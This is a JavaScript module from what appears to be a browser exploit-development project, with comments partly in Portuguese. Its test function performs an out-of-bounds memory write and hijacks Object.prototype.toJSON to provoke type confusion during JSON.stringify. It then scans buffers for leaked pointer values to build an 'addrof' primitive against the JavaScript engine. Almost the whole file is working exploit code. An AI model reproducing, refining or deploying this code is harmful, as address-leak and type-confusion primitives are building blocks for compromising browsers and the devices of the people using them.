// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v20_TriggerObjectConfusion)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC = "OriginalHeisenbug_TypedArrayAddrof_v20_TriggerObjectConfusion";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v20 = null;
let object_to_leak_B_v20 = null;
let victim_typed_array_ref_v20 = null; 
let underlying_victim_buffer_view_v20 = null; // Float64Array view of the victim's buffer
let trigger_object_v20 = null; // Objeto que esperamos que seja confuso
let probe_call_count_v20 = 0;
let last_confused_trigger_details_v20 = null; 

function toJSON_TA_Probe_TriggerObjectConfusion() {
    probe_call_count_v20++;
    const call_num = probe_call_count_v20;
    const current_this_type = Object.prototype.toString.call(this);
    logS3(`[TOC_Probe_v20] Call #${call_num}. 'this' type: ${current_this_type}.`, "leak");

    if (call_num === 1 && this === victim_typed_array_ref_v20) {
        logS3(`[TOC_Probe_v20] Call #${call_num}: 'this' is victim_typed_array_ref_v20. Returning trigger_object_v20.`, "info");
        trigger_object_v20 = { 
            id: "trigger_obj_v20",
            victim_buffer_view: underlying_victim_buffer_view_v20, // Passa a view real do buffer
            marker_A: null, // Para tentar vazar ponteiros no próprio trigger_object
            marker_B: null
        };
        return trigger_object_v20;
    } else if (this === trigger_object_v20) { 
        logS3(`[TOC_Probe_v20] Call #${call_num}: 'this' IS trigger_object_v20. Current type: ${current_this_type}`, "info");
        
        last_confused_trigger_details_v20 = { // Armazena detalhes desta interação
            call_number: call_num,
            this_type: current_this_type,
            trigger_id_match: (this.id === "trigger_obj_v20"),
            writes_to_victim_buffer_view_attempted: false,
            writes_to_trigger_object_attempted: false,
            error: null
        };

        if (current_this_type === '[object Object]') {
            logS3(`[TOC_Probe_v20] Call #${call_num}: trigger_object_v20 ('this') is [object Object]. TYPE CONFUSION ON TRIGGER!`, "vuln");
            try {
                logS3(`[TOC_Probe_v20] Call #${call_num}: Attempting writes via this.victim_buffer_view...`, "warn");
                if (object_to_leak_A_v20 && this.victim_buffer_view) this.victim_buffer_view[0] = object_to_leak_A_v20;
                if (object_to_leak_B_v20 && this.victim_buffer_view) this.victim_buffer_view[1] = object_to_leak_B_v20;
                last_confused_trigger_details_v20.writes_to_victim_buffer_view_attempted = true;

                logS3(`[TOC_Probe_v20] Call #${call_num}: Attempting writes to this.marker_A/B...`, "warn");
                if (object_to_leak_A_v20) this.marker_A = object_to_leak_A_v20;
                if (object_to_leak_B_v20) this.marker_B = object_to_leak_B_v20;
                last_confused_trigger_details_v20.writes_to_trigger_object_attempted = true;
                logS3(`[TOC_Probe_v20] Call #${call_num}: Writes completed. Keys of 'this' (trigger_object): ${Object.keys(this).join(',')}`, "info");

            } catch(e_write) {
                last_confused_trigger_details_v20.error = e_write.message;
            }
        } else {
            logS3(`[TOC_Probe_v20] Call #${call_num}: trigger_object_v20 ('this') is NOT [object Object]. Type: ${current_this_type}`, "warn");
        }
        return undefined; // Tenta parar mais recursão neste objeto
    } else {
         // Se 'this' for o victim_typed_array_ref_v20 novamente na call #2 (devido ao aninhamento)
        if (this === victim_typed_array_ref_v20 && call_num > 1) {
             logS3(`[TOC_Probe_v20] Call #${call_num}: 'this' is victim_typed_array_ref_v20 (again). Type: ${current_this_type}. Returning undefined.`, "info");
             return undefined;
        }
        logS3(`[TOC_Probe_v20] Call #${call_num}: 'this' is unexpected. Type: ${current_this_type}. Returning undefined.`, "warn");
        return undefined;
    }
}


export async function executeTypedArrayVictimAddrofTest_TriggerObjectConfusion() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TriggerObjectConfusion) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC} Init...`;

    probe_call_count_v20 = 0;
    victim_typed_array_ref_v20 = null; 
    underlying_victim_buffer_view_v20 = null;
    trigger_object_v20 = null;
    last_confused_trigger_details_v20 = null;
    object_to_leak_A_v20 = { marker: "ObjA_TA_v20toc", id: Date.now() }; 
    object_to_leak_B_v20 = { marker: "ObjB_TA_v20toc", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput = null; 
    
    let addrof_Victim_A = { success: false, msg: "VictimBuf[0]: Default" };
    let addrof_Victim_B = { success: false, msg: "VictimBuf[1]: Default" };
    let addrof_Trigger_A = { success: false, msg: "Trigger.marker_A: Default" };
    let addrof_Trigger_B = { success: false, msg: "Trigger.marker_B: Default" };

    const fillPattern = 0.20202020202020;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        let underlying_ab = new ArrayBuffer(VICTIM_BUFFER_SIZE);
        victim_typed_array_ref_v20 = new Uint8Array(underlying_ab); 
        underlying_victim_buffer_view_v20 = new Float64Array(underlying_ab); 
        for(let i = 0; i < underlying_victim_buffer_view_v20.length; i++) underlying_victim_buffer_view_v20[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v20 and its view created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_TriggerObjectConfusion, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v20); 
            logS3(`  JSON.stringify completed. Stringify Output (parsed, if obj): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            logS3(`  Details of interaction with trigger_object (if occurred): ${last_confused_trigger_details_v20 ? JSON.stringify(last_confused_trigger_details_v20) : 'N/A (trigger_object not reached or not confused)'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugConfirmedOnTrigger = false;
            if (last_confused_trigger_details_v20 && last_confused_trigger_details_v20.this_type === "[object Object]" && last_confused_trigger_details_v20.trigger_id_match) {
                heisenbugConfirmedOnTrigger = true;
                logS3(`  HEISENBUG ON trigger_object CONFIRMED!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  ALERT: Heisenbug on trigger_object NOT confirmed.`, "error", FNAME_CURRENT_TEST);
            }
                
            logS3("STEP 3: Checking victim buffer...", "warn", FNAME_CURRENT_TEST);
            const val_A = underlying_victim_buffer_view_v20[0];
            let temp_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_A]).buffer)[0], new Uint32Array(new Float64Array([val_A]).buffer)[1]);
            if (val_A !== (fillPattern + 0) && val_A !== 0 && (temp_A_int64.high() < 0x00020000 || (temp_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_Victim_A.success = true; addrof_Victim_A.msg = `Possible pointer in victim_buffer_view[0]: ${temp_A_int64.toString(true)}`;
            } else { addrof_Victim_A.msg = `No pointer in victim_buffer_view[0]. Val: ${val_A}`; }

            const val_B = underlying_victim_buffer_view_v20[1];
            // ... (similar for B)
            let temp_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_B]).buffer)[0], new Uint32Array(new Float64Array([val_B]).buffer)[1]);
            if (val_B !== (fillPattern + 1) && val_B !== 0 && (temp_B_int64.high() < 0x00020000 || (temp_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_Victim_B.success = true; addrof_Victim_B.msg = `Possible pointer in victim_buffer_view[1]: ${temp_B_int64.toString(true)}`;
            } else { addrof_Victim_B.msg = `No pointer in victim_buffer_view[1]. Val: ${val_B}`; }


            // Check stringifyOutput for leaked markers if it's the trigger_object
            logS3("STEP 4: Checking stringifyOutput for leaked markers (if it is the trigger_object)...", "warn", FNAME_CURRENT_TEST);
            let parsedStringifyOutput = null;
            if (typeof stringifyOutput === 'string') {
                try { parsedStringifyOutput = JSON.parse(stringifyOutput); } catch (e) { /* ignore */ }
            } else { // if toJSON returned an object that wasn't further stringified
                parsedStringifyOutput = stringifyOutput;
            }

            if (parsedStringifyOutput && parsedStringifyOutput.id === "trigger_obj_v20") {
                if (parsedStringifyOutput.marker_A && typeof parsedStringifyOutput.marker_A === 'number' && parsedStringifyOutput.marker_A !== 0) {
                    let s_mkrA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([parsedStringifyOutput.marker_A]).buffer)[0], new Uint32Array(new Float64Array([parsedStringifyOutput.marker_A]).buffer)[1]);
                    if (s_mkrA_int64.high() < 0x00020000 || (s_mkrA_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Trigger_A.success = true; addrof_Trigger_A.msg = `Possible pointer for marker_A in stringifyOutput: ${s_mkrA_int64.toString(true)}`;
                    } else { addrof_Trigger_A.msg = `stringifyOutput.marker_A is number but not pointer-like: ${parsedStringifyOutput.marker_A}`; }
                } else { addrof_Trigger_A.msg = `stringifyOutput.marker_A not a pointer or not present. Value: ${parsedStringifyOutput.marker_A}`; }
                 // ... (similar for marker_B)
                if (parsedStringifyOutput.marker_B && typeof parsedStringifyOutput.marker_B === 'number' && parsedStringifyOutput.marker_B !== 0) {
                    let s_mkrB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([parsedStringifyOutput.marker_B]).buffer)[0], new Uint32Array(new Float64Array([parsedStringifyOutput.marker_B]).buffer)[1]);
                    if (s_mkrB_int64.high() < 0x00020000 || (s_mkrB_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Trigger_B.success = true; addrof_Trigger_B.msg = `Possible pointer for marker_B in stringifyOutput: ${s_mkrB_int64.toString(true)}`;
                    } else { addrof_Trigger_B.msg = `stringifyOutput.marker_B is number but not pointer-like: ${parsedStringifyOutput.marker_B}`; }
                } else { addrof_Trigger_B.msg = `stringifyOutput.marker_B not a pointer or not present. Value: ${parsedStringifyOutput.marker_B}`; }
            } else {
                 addrof_Trigger_A.msg = "stringifyOutput was not the trigger_object.";
                 addrof_Trigger_B.msg = "stringifyOutput was not the trigger_object.";
            }


            if (addrof_Victim_A.success || addrof_Victim_B.success || addrof_Trigger_A.success || addrof_Trigger_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC}: Addr? SUCESSO!`;
            } else if (heisenbugConfirmedOnTrigger) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC}: Heisenbug OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC}: Heisenbug Fail?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TOC} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v20}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof VictimBuf[0]: Success=${addrof_Victim_A.success}, Msg='${addrof_Victim_A.msg}'`, addrof_Victim_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof VictimBuf[1]: Success=${addrof_Victim_B.success}, Msg='${addrof_Victim_B.msg}'`, addrof_Victim_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof TriggerObj.A: Success=${addrof_Trigger_A.success}, Msg='${addrof_Trigger_A.msg}'`, addrof_Trigger_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof TriggerObj.B: Success=${addrof_Trigger_B.success}, Msg='${addrof_Trigger_B.msg}'`, addrof_Trigger_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v20 = null; 
        trigger_object_v20 = null;
        last_confused_trigger_details_v20 = null;
        probe_call_count_v20 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        stringifyResult: stringifyOutput, 
        toJSON_details: last_confused_trigger_details_v20, 
        total_probe_calls: probe_call_count_v20,
        addrof_victim_A: addrof_Victim_A,
        addrof_victim_B: addrof_Victim_B,
        addrof_controller_A: addrof_Trigger_A, // Renomeado para consistência com o runner
        addrof_controller_B: addrof_Trigger_B  // Renomeado para consistência com o runner
    };
}
